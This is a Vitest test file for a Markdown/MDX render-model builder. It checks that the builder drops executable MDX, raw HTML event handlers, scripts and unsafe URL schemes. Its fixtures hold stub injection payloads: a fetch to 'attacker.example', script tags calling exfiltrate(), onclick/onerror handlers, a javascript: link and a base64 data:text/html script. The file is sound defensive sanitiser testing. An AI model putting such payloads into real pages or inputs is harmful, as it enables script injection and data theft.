import { describe, expect, it } from "vitest"
import { buildGenericRenderModel } from "../generic-render-model"

describe("buildGenericRenderModel", () => {
  it("converts supported Markdown and GFM syntax into a serializable render model", () => {
    const source = `# Hello

Read **strong** and [the guide](https://example.com/docs) with ![an image](/images/cover.png) and \`inline code\`.

- First
- Second

1. Ordered

> A quoted paragraph.

\`\`\`ts
const answer = 42
\`\`\`

| Name | Value |
| --- | ---: |
| Safe | Yes |
`

    const model = buildGenericRenderModel(source)

    expect(model.blocks.map((block) => block.type)).toEqual([
      "heading",
      "paragraph",
      "list",
      "list",
      "blockquote",
      "code",
      "table",
    ])
    expect(model.blocks[0]).toEqual({
      type: "heading",
      depth: 1,
      text: "Hello",
      children: [{ type: "text", value: "Hello" }],
    })
    expect(model.blocks[1]).toEqual(
      expect.objectContaining({
        type: "paragraph",
        children: expect.arrayContaining([
          {
            type: "link",
            url: "https://example.com/docs",
            title: null,
            children: [{ type: "text", value: "the guide" }],
          },
          { type: "image", url: "/images/cover.png", title: null, alt: "an image" },
          { type: "inline-code", value: "inline code" },
        ]),
      }),
    )
    expect(model.blocks[5]).toEqual({ type: "code", language: "ts", meta: null, value: "const answer = 42" })
    expect(model.blocks[6]).toEqual(
      expect.objectContaining({
        type: "table",
        align: [null, "right"],
      }),
    )
    expect(JSON.parse(JSON.stringify(model))).toEqual(model)
  })

  it("turns JSX into inert placeholders and discards executable MDX source", () => {
    const source = `import Secret from "./secret"
export const token = readToken()

# Hello

<Chart data={loadSecret()} onClick={() => steal()} />

{fetch("https://attacker.example")}

<div onclick="steal()"><script>exfiltrate()</script></div>
`

    const model = buildGenericRenderModel(source)
    const serialized = JSON.stringify(model)

    expect(model.blocks).toContainEqual(expect.objectContaining({ type: "component-placeholder", name: "Chart" }))
    expect(model.blocks).toContainEqual(expect.objectContaining({ type: "component-placeholder", name: "div" }))
    for (const executableSource of [
      "./secret",
      "readToken",
      "loadSecret",
      "onClick",
      "steal",
      "fetch",
      "attacker.example",
      "onclick",
      "script",
      "exfiltrate",
    ]) {
      expect(serialized).not.toContain(executableSource)
    }
  })

  it("drops unsafe URL targets without dropping their readable labels", () => {
    const model = buildGenericRenderModel(
      `[safe](../guide) [anchor](#intro) [mail](mailto:hello@example.com) [bad](javascript:alert(1)) ![bad image](data:text/html;base64,PHNjcmlwdD4=)`,
    )
    const serialized = JSON.stringify(model)

    expect(serialized).toContain("../guide")
    expect(serialized).toContain("#intro")
    expect(serialized).toContain("mailto:hello@example.com")
    expect(serialized).toContain('"value":"bad"')
    expect(serialized).not.toContain("javascript:")
    expect(serialized).not.toContain("data:text/html")
  })

  it("resolves safe reference-style links and images", () => {
    const model = buildGenericRenderModel(`Read [the guide][guide] and view ![the cover][cover].

[guide]: /docs/guide "Guide"
[cover]: https://example.com/cover.png "Cover"`)
    const serialized = JSON.stringify(model)

    expect(serialized).toContain('"type":"link","url":"/docs/guide","title":"Guide"')
    expect(serialized).toContain(
      '"type":"image","url":"https://example.com/cover.png","title":"Cover","alt":"the cover"',
    )
  })

  it("treats raw HTML as inert component placeholders", () => {
    const model = buildGenericRenderModel(
      `<img src="x" onerror="steal()"><iframe srcdoc="<script>bad()</script>"></iframe>`,
    )
    const serialized = JSON.stringify(model)

    expect(model.blocks).toContainEqual({ type: "component-placeholder", name: "img" })
    expect(model.blocks).toContainEqual({ type: "component-placeholder", name: "iframe" })
    expect(serialized).not.toContain("onerror")
    expect(serialized).not.toContain("srcdoc")
    expect(serialized).not.toContain("steal")
    expect(serialized).not.toContain("bad()")
  })

  it("fails closed when malformed MDX is mixed with executable source", () => {
    const model = buildGenericRenderModel(`import Secret from "./secret"

# Still readable

<Broken value={steal()}>`)
    const serialized = JSON.stringify(model)

    expect(serialized).not.toContain("./secret")
    expect(serialized).not.toContain("steal")
    expect(serialized).not.toContain("Still readable")
    expect(model.blocks).toContainEqual({ type: "component-placeholder", name: "Broken" })
  })
})
